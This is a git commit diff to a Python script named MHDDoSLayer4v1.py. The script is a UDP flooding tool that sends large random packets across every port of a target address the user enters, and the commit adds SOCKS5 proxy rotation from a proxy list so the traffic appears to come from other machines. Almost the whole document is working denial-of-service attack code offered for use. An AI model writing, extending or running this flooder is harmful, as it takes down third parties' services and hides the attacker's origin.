dca3eb0f838cea8191d4e62f42897bc46e81709d
MHProDev <63018646+MHProDev@users.noreply.github.com>
2020-10-20 22:35:34 +0330

    Update MHDDoSLayer4v1.py

--- MHDDoSLayer4v1.py
+++ MHDDoSLayer4v1.py
@@ -1,4 +1,5 @@
 import socket
+import socks
 import random
 from time import sleep
 
@@ -17,22 +18,26 @@ print('''
 \033[92m         ┃┃┃┃┃┃ ┃┃ ┃┃ ┏┛┗┛┃ ┃┗━┛┃ ┃┗━┛┃
 \033[92m         ┗┛┗┛┗┛ ┗┛ ┗┛ ┗━━━┛ ┗━━━┛ ┗━━━┛    
 \033[91m +--------------------------------------------+''')
-print_slow('\033[94m    Coded By MH_ProDev')
+print_slow('\033[94m      Coded By MH_ProDev, Anti-Hack')
 print('''\033[91m +--------------------------------------------+\033[97m''')
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
 ip = input("\n\033[96m❖ \033[97mAddress Site Ya IP Vared Kunid » \033[0m")
 bytes = random._urandom(65500)
-sent = 0
 port = 1
+proxy = "127.0.0.1"
+proxylist = input("\n\033[96m❖ \033[97mList Proxy Haro Vared Kunid [socks5.txt] » \033[0m")
+with open(proxylist, "r") as f:
+    lines = f.readlines()
 while True:
   try:
     if port == 65535:
       port = 1
+    proxy = random.choice(lines)
+    socks.set_default_proxy(socks.SOCKS5, proxy)
     sock.sendto(bytes,(ip,port))
-    sent = sent + 1
     port = port + 1
-    print("\033[97m[\033[92m!\033[97m] \033[97mPacket Sended \033[95m@ \033[97m%s"%sent)
+    print("\033[97m[\033[92m!\033[97m] \033[97mPacket Sended By\033[96m", proxy)
       
   except KeyboardInterrupt:
     exit()
